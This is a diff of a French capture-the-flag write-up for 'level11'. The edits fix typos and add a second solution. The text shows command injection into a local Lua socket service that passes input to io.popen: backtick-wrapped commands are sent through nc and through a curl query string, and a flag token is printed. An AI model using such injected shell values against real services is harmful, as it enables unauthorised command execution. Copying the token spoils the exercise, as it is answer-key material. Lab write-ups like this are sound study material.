@@ -8,14 +8,14 @@
 
 - On a un fichier lua éxecutable et avec son code source (principe du code lua)
 cat level11.lua
-    -> on remarque que l'on a une connexion à une socket sur 127.0.0.1 port 5151!
+    -> on remarque que l'on a une connexion à un socket sur 127.0.0.1 port 5151!
 
 On voit aussi un io.popen avec un appel de la fonction echo qui est exploitable.
 - On teste si le programme lua est éxecutable
 ./level11.lua
     -> erreur: address already in use -> donc le script est déjà éxecuté.
 ps -aux
-    -> on trouve le programme execute par flag11
+    -> on trouve le programme executé par flag11
 
 On va donc pouvoir exploiter ces failles. 
 - exploitation du socket avec curl:
@@ -28,6 +28,10 @@ On est sur la bonne voie mais en curl ca semble pas possible.
 - 2e tentative: exploiter la fonction echo avec nc:
 nc 127.0.0.1 5151 
 Password: `getflag > /tmp/flag`
-    -> ke fichier /tmp/flag:
+    -> le fichier /tmp/flag:
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
-Token trouve!
+
+- Autre solution par curl:
+curl http://127.0.0.1:5151?"\`getflag>/tmp/flag\`"
+    -> Token trouvé aussi!
+
